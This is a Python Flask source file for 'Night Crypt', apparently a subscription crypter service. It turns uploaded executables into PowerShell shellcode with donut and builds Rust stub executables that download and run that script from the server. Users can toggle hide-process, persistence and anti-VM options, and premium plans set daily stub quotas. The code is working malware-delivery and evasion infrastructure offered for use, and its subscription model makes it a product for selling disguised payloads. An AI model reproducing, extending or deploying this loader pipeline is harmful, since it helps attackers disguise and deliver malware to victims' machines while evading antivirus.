from flask import Flask, request, jsonify, session, send_file, send_from_directory
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
import json
import os
import datetime
from pathlib import Path
import donut
import subprocess
import hashlib  # Added hashlib for SHA256 hashing

app = Flask(__name__)
app.secret_key = 'night-crypt-secret-key-2024'

# Configuration
PORT = 3333
UPLOAD_FOLDER = 'stubs'
MAX_CONTENT_LENGTH = 50 * 1024 * 1024  # 50MB limit

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH

# Database path
DB_PATH = os.path.join('db', 'users.json')
STUBS_PATH = 'stubs'

# Ensure directories exist
os.makedirs('db', exist_ok=True)
os.makedirs(STUBS_PATH, exist_ok=True)
os.makedirs(os.path.join(STUBS_PATH, 'main'), exist_ok=True)

def read_users():
    """Helper function to read users from JSON file"""
    try:
        with open(DB_PATH, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def write_users(users):
    """Helper function to write users to JSON file"""
    try:
        with open(DB_PATH, 'w') as f:
            json.dump(users, f, indent=2)
        return True
    except Exception as e:
        print(f"Error writing users: {e}")
        return False

def get_user_stub_info(user_id):
    """Get user's stub information and statistics"""
    user_ps_path = os.path.join(STUBS_PATH, user_id, 'ps')
    user_exe_path = os.path.join(STUBS_PATH, user_id, 'exe')

    files = []

    if os.path.exists(user_ps_path):
        try:
            for filename in os.listdir(user_ps_path):
                if filename.endswith('.ps1'):
                    file_path = os.path.join(user_ps_path, filename)
                    if os.path.isfile(file_path):
                        stat = os.stat(file_path)
                        files.append({
                            'name': filename,
                            'path': os.path.join(user_id, 'ps', filename),
                            'size': stat.st_size,
                            'created': datetime.datetime.fromtimestamp(stat.st_ctime).strftime('%m/%d/%Y'),
                            'modified': datetime.datetime.fromtimestamp(stat.st_mtime).strftime('%m/%d/%Y'),
                            'type': 'ps1'
                        })
        except Exception as e:
            print(f"Error reading PowerShell files: {e}")

    if os.path.exists(user_exe_path):
        try:
            for filename in os.listdir(user_exe_path):
                if filename.endswith('.exe'):
                    file_path = os.path.join(user_exe_path, filename)
                    if os.path.isfile(file_path):
                        stat = os.stat(file_path)
                        files.append({
                            'name': filename,
                            'path': os.path.join(user_id, 'exe', filename),
                            'size': stat.st_size,
                            'created': datetime.datetime.fromtimestamp(stat.st_ctime).strftime('%m/%d/%Y'),
                            'modified': datetime.datetime.fromtimestamp(stat.st_mtime).strftime('%m/%d/%Y'),
                            'type': 'exe'
                        })
        except Exception as e:
            print(f"Error reading executable files: {e}")

    # Calculate stats based on exe files only
    exe_files = [f for f in files if f['type'] == 'exe']
    now = datetime.datetime.now()
    week_ago = now - datetime.timedelta(days=7)
    recent_files = [f for f in exe_files if datetime.datetime.strptime(f['created'], '%m/%d/%Y') > week_ago]

    return {
        'files': files,
        'stats': {
            'total': len(exe_files),
            'active': len(exe_files),
            'recent': len(recent_files)
        }
    }

# Static file routes
@app.route('/')
def index():
    return send_from_directory('html', 'index.html')

@app.route('/login')
def login_page():
    return send_from_directory('html', 'login.html')

@app.route('/register')
def register_page():
    return send_from_directory('html', 'register.html')

@app.route('/dashboard')
def dashboard_page():
    return send_from_directory('html', 'dashboard.html')

@app.route('/css/<path:filename>')
def css_files(filename):
    return send_from_directory('css', filename)

@app.route('/script/<path:filename>')
def script_files(filename):
    return send_from_directory('script', filename)

@app.route('/html/<path:filename>')
def html_files(filename):
    return send_from_directory('html', filename)

# Authentication API routes
@app.route('/api/register', methods=['POST'])
def register():
    try:
        data = request.get_json()
        username = data.get('username')
        email = data.get('email')
        password = data.get('password')

        if not all([username, email, password]):
            return jsonify({'success': False, 'message': 'All fields are required'}), 400

        users = read_users()

        # Check if user already exists
        if any(user['username'] == username or user['email'] == email for user in users):
            return jsonify({'success': False, 'message': 'Username or email already exists'}), 400

        # Hash password
        hashed_password = generate_password_hash(password)

        new_user = {
            'id': str(int(datetime.datetime.now().timestamp() * 1000)),
            'username': username,
            'email': email,
            'password': hashed_password,
            'createdAt': datetime.datetime.now().isoformat(),
            'isPremium': False,
            'subscriptionType': None,
            'subscriptionExpiry': None,
            'dailyLimit': 0,
            'dailyUsage': 0,
            'lastResetDate': None
        }

        users.append(new_user)

        if write_users(users):
            return jsonify({'success': True, 'message': 'Registration successful'})
        else:
            return jsonify({'success': False, 'message': 'Error saving user'}), 500

    except Exception as e:
        print(f"Registration error: {e}")
        return jsonify({'success': False, 'message': 'Internal server error'}), 500

@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')

        if not all([username, password]):
            return jsonify({'success': False, 'message': 'Username and password are required'}), 400

        users = read_users()
        user = next((u for u in users if u['username'] == username or u['email'] == username), None)

        if not user:
            return jsonify({'success': False, 'message': 'Invalid credentials'}), 400

        if not check_password_hash(user['password'], password):
            return jsonify({'success': False, 'message': 'Invalid credentials'}), 400

        # Set session
        session['userId'] = user['id']
        session['username'] = user['username']

        return jsonify({
            'success': True,
            'message': 'Login successful',
            'user': {'username': user['username'], 'email': user['email']}
        })

    except Exception as e:
        print(f"Login error: {e}")
        return jsonify({'success': False, 'message': 'Internal server error'}), 500

@app.route('/api/logout', methods=['POST'])
def logout():
    try:
        session.clear()
        return jsonify({'success': True, 'message': 'Logout successful'})
    except Exception as e:
        return jsonify({'success': False, 'message': 'Error logging out'}), 500

@app.route('/api/user', methods=['GET'])
def get_user():
    if 'userId' not in session:
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    users = read_users()
    user = next((u for u in users if u['id'] == session['userId']), None)

    if user:
        user = reset_daily_usage_if_needed(user)
        user = check_premium_status(user)

        # Update user in database if changes were made
        write_users(users)

        return jsonify({
            'success': True,
            'user': {
                'id': user['id'],
                'username': user['username'],
                'email': user['email'],
                'createdAt': user['createdAt'],
                'isPremium': user.get('isPremium', False),
                'subscriptionType': user.get('subscriptionType'),
                'subscriptionExpiry': user.get('subscriptionExpiry'),
                'dailyLimit': user.get('dailyLimit', 0),
                'dailyUsage': user.get('dailyUsage', 0),
                'lastResetDate': user.get('lastResetDate')
            }
        })
    else:
        return jsonify({'success': False, 'message': 'User not found'}), 404

@app.route('/api/create-stub', methods=['POST'])
def create_stub():
    if 'userId' not in session:
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    try:
        user_id = session['userId']
        users = read_users()
        current_user = next((u for u in users if u['id'] == user_id), None)

        if not current_user:
            return jsonify({'success': False, 'message': 'User not found'}), 404

        can_create, message = can_create_stub(current_user)
        if not can_create:
            return jsonify({'success': False, 'message': message}), 403

        user_stubs_path = os.path.join(STUBS_PATH, user_id)
        user_ps_path = os.path.join(user_stubs_path, 'ps')
        user_exe_path = os.path.join(user_stubs_path, 'exe')

        os.makedirs(user_ps_path, exist_ok=True)
        os.makedirs(user_exe_path, exist_ok=True)

        uploaded_file = None
        ps1_file_created = None
        cpp_exe_created = None

        user_plain_password = f"{user_id}_night_crypt_key"

        if 'file' in request.files:
            file = request.files['file']
            if file.filename != '' and file.filename.lower().endswith('.exe'):
                filename = secure_filename(file.filename)
                temp_file_path = os.path.join(user_stubs_path, filename)
                file.save(temp_file_path)

                try:
                    shellcode = donut.create(
                        file=os.path.abspath(temp_file_path),
                        arch=2,  # x64 architecture
                        format=8  # PowerShell format
                    )

                    template_path = os.path.join('templates', 'shellcode_template.ps1')
                    with open(template_path, 'r', encoding='utf-8') as f:
                        ps_template = f.read()

                    if isinstance(shellcode, bytes):
                        shellcode_bytes = ','.join([f'0x{b:02x}' for b in shellcode])
                        shellcode_formatted = f"@({shellcode_bytes})"
                    else:
                        shellcode_hex = shellcode if isinstance(shellcode, str) else ''.join([f'{b:02x}' for b in shellcode])
                        hex_bytes = [shellcode_hex[i:i+2] for i in range(0, len(shellcode_hex), 2)]
                        shellcode_formatted = f"@({','.join([f'0x{b}' for b in hex_bytes])})"

                    ps_script = ps_template.replace('{{SHELLCODE_PLACEHOLDER}}', shellcode_formatted)

                    ps1_number = 1
                    while os.path.exists(os.path.join(user_ps_path, f"{ps1_number}.ps1")):
                        ps1_number += 1

                    ps1_filename = f"{ps1_number}.ps1"
                    ps1_path = os.path.join(user_ps_path, ps1_filename)
                    with open(ps1_path, 'w', encoding='utf-8') as f:
                        f.write(ps_script)

                    ps1_file_created = ps1_filename
                    uploaded_file = filename

                    try:
                        rust_template_path = os.path.join('templates', 'rust_stub', 'src', 'main.rs.template')
                        with open(rust_template_path, 'r', encoding='utf-8') as f:
                            rust_template = f.read()

                        ps_script_url = f"http://127.0.0.1:{PORT}/stubs/{user_id}/ps/{ps1_filename}"

                        rust_code = rust_template.replace('{{POWERSHELL_URL}}', ps_script_url)

                        rust_main_path = os.path.join('templates', 'rust_stub', 'src', 'main.rs')
                        with open(rust_main_path, 'w', encoding='utf-8') as f:
                            f.write(rust_code)

                        exe_filename = f"exp_stub_{ps1_number}.exe"
                        exe_path = os.path.join(user_exe_path, exe_filename)

                        compile_cmd = [
                            'cargo', 'build', '--release', '--target', 'x86_64-pc-windows-gnu'
                        ]

                        result = subprocess.run(compile_cmd, cwd=os.path.join('templates', 'rust_stub'), capture_output=True, text=True, shell=True)

                        if result.returncode == 0:
                            cpp_exe_created = exe_filename
                            print(f"Successfully compiled Rust stub: {exe_filename}")

                            # Move the compiled executable to the user's exe folder
                            compiled_exe_path = os.path.join('templates', 'rust_stub', 'target', 'x86_64-pc-windows-gnu', 'release', 'rust_s.exe')
                            os.rename(compiled_exe_path, exe_path)
                        else:
                            print(f"Rust compilation failed: {result.stderr}")

                    except Exception as rust_error:
                        print(f"Error creating Rust stub: {rust_error}")

                    os.remove(temp_file_path)

                except Exception as e:
                    print(f"Error converting .exe to shellcode: {e}")
                    if os.path.exists(temp_file_path):
                        os.remove(temp_file_path)
                    return jsonify({'success': False, 'message': f'Error converting .exe file to PowerShell shellcode: {str(e)}'}), 500

        file_name = request.form.get('fileName', '')
        auto_start = request.form.get('autoStart') == 'true'
        hide_process = request.form.get('hideProcess') == 'true'
        persistence = request.form.get('persistence') == 'true'
        anti_vm = request.form.get('antiVM') == 'true'

        stub_config = {
            'fileName': file_name,
            'options': {
                'autoStart': auto_start,
                'hideProcess': hide_process,
                'persistence': persistence,
                'antiVM': anti_vm
            },
            'createdAt': datetime.datetime.now().isoformat(),
            'hasUploadedFile': uploaded_file is not None,
            'powershellFile': ps1_file_created,
            'cppExecutable': cpp_exe_created
        }

        config_path = os.path.join(user_stubs_path, f"{file_name}.config.json")
        with open(config_path, 'w') as f:
            json.dump(stub_config, f, indent=2)

        increment_daily_usage(user_id)

        success_message = 'Stub created successfully'
        if ps1_file_created:
            success_message += f' - PowerShell file: {ps1_file_created}'
        if cpp_exe_created:
            success_message += f' - C++ executable: {cpp_exe_created}'

        return jsonify({
            'success': True,
            'message': success_message,
            'folderPath': f'stubs/{user_id}',
            'config': stub_config,
            'executableFile': cpp_exe_created
        })

    except Exception as e:
        print(f"Error creating stub: {e}")
        return jsonify({'success': False, 'message': 'Error creating stub'}), 500

@app.route('/api/upgrade', methods=['POST'])
def upgrade_to_premium():
    if 'userId' not in session:
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    data = request.get_json()
    plan = data.get('plan')

    if plan not in ['monthly', 'yearly']:
        return jsonify({'success': False, 'message': 'Invalid plan'}), 400

    users = read_users()
    user = next((u for u in users if u['id'] == session['userId']), None)

    if not user:
        return jsonify({'success': False, 'message': 'User not found'}), 404

    # Calculate expiry date
    now = datetime.datetime.now()
    if plan == 'monthly':
        expiry = now + datetime.timedelta(days=30)
        daily_limit = 5
    else:  # yearly
        expiry = now + datetime.timedelta(days=365)
        daily_limit = 10

    # Update user
    user['isPremium'] = True
    user['subscriptionType'] = plan
    user['subscriptionExpiry'] = expiry.isoformat()
    user['dailyLimit'] = daily_limit
    user['dailyUsage'] = 0
    user['lastResetDate'] = now.strftime('%Y-%m-%d')

    write_users(users)

    return jsonify({
        'success': True,
        'message': f'Successfully upgraded to {plan} plan',
        'expiry': expiry.isoformat()
    })

@app.route('/api/user/stats', methods=['GET'])
def get_user_stats():
    if 'userId' not in session:
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    user_id = session['userId']
    stub_info = get_user_stub_info(user_id)

    return jsonify(stub_info['stats'])

@app.route('/api/user/activity', methods=['GET'])
def get_user_activity():
    if 'userId' not in session:
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    # Mock activity data - in real app, you'd query actual activity
    activities = [
        {
            'icon': '🔧',
            'title': 'Stub Created',
            'subtitle': 'document.exe',
            'time': '2 hours ago',
            'status': 'Success',
            'statusClass': 'success'
        },
        {
            'icon': '📁',
            'title': 'File Uploaded',
            'subtitle': 'payload.bin',
            'time': '1 day ago',
            'status': 'Complete',
            'statusClass': 'complete'
        }
    ]

    return jsonify(activities)

@app.route('/api/user/files', methods=['GET'])
def get_user_files():
    if 'userId' not in session:
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    stub_info = get_user_stub_info(session['userId'])
    return jsonify(stub_info['files'])

@app.route('/api/download/<path:file_path>', methods=['GET'])
def download_file(file_path):
    if 'userId' not in session:
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    if not file_path.startswith(session['userId'] + '/exe/') or not file_path.endswith('.exe'):
        return jsonify({'success': False, 'message': 'Access denied'}), 403

    full_path = os.path.join(STUBS_PATH, file_path)

    if os.path.exists(full_path):
        return send_file(full_path, as_attachment=True)
    else:
        return jsonify({'success': False, 'message': 'File not found'}), 404

@app.route('/api/view-file/<path:file_path>', methods=['GET'])
def view_file(file_path):
    if 'userId' not in session:
        return jsonify({'success': False, 'message': 'Not authenticated'}), 401

    # Only allow viewing PowerShell files and ensure user owns the file
    if not file_path.startswith(session['userId'] + '/ps/') or not file_path.endswith('.ps1'):
        return jsonify({'success': False, 'message': 'Access denied'}), 403

    full_path = os.path.join(STUBS_PATH, file_path)

    if os.path.exists(full_path):
        try:
            with open(full_path, 'r', encoding='utf-8') as f:
                content = f.read()
            return content, 200, {'Content-Type': 'text/plain; charset=utf-8'}
        except Exception as e:
            return jsonify({'success': False, 'message': 'Error reading file'}), 500
    else:
        return jsonify({'success': False, 'message': 'File not found'}), 404

@app.route('/stubs/<user_id>/ps/<filename>')
def serve_powershell_script(user_id, filename):
    if not filename.endswith('.ps1'):
        return jsonify({'error': 'Invalid file type'}), 400

    auth_key = request.args.get('key')
    if not auth_key:
        return jsonify({'error': 'Authentication key required'}), 401

    expected_key = hashlib.sha256(f"{user_id}_night_crypt_key".encode()).hexdigest()
    if auth_key != expected_key:
        return jsonify({'error': 'Invalid authentication key'}), 403

    file_path = os.path.join(STUBS_PATH, user_id, 'ps', filename)

    if os.path.exists(file_path):
        return send_file(file_path, mimetype='text/plain')
    else:
        return jsonify({'error': 'File not found'}), 404

def reset_daily_usage_if_needed(user):
    """Reset daily usage if it's a new day"""
    today = datetime.datetime.now().strftime('%Y-%m-%d')
    if user.get('lastResetDate') != today:
        user['dailyUsage'] = 0
        user['lastResetDate'] = today
    return user

def check_premium_status(user):
    """Check if user's premium subscription is still valid"""
    if user.get('isPremium') and user.get('subscriptionExpiry'):
        try:
            expiry_date = datetime.datetime.fromisoformat(user['subscriptionExpiry'])
            if datetime.datetime.now() > expiry_date:
                user['isPremium'] = False
                user['subscriptionType'] = None
                user['subscriptionExpiry'] = None
                user['dailyLimit'] = 0
        except ValueError:
            pass
    return user

def can_create_stub(user):
    """Check if user can create a stub (premium + daily limit)"""
    user = reset_daily_usage_if_needed(user)
    user = check_premium_status(user)

    if not user.get('isPremium', False):
        return False, "Premium membership required to create stubs"

    if user.get('dailyUsage', 0) >= user.get('dailyLimit', 0):
        return False, "Daily limit reached. Try again tomorrow"

    return True, "OK"

def increment_daily_usage(user_id):
    """Increment user's daily usage count"""
    users = read_users()
    for user in users:
        if user['id'] == user_id:
            user['dailyUsage'] = user.get('dailyUsage', 0) + 1
            break
    write_users(users)

if __name__ == '__main__':
    print(f"🚀 Night Crypt server running on http://localhost:{PORT}")
    print(f"📁 Database: {DB_PATH}")
    print(f"📂 Stubs: {STUBS_PATH}")
    app.run(host='0.0.0.0', port=PORT, debug=True)
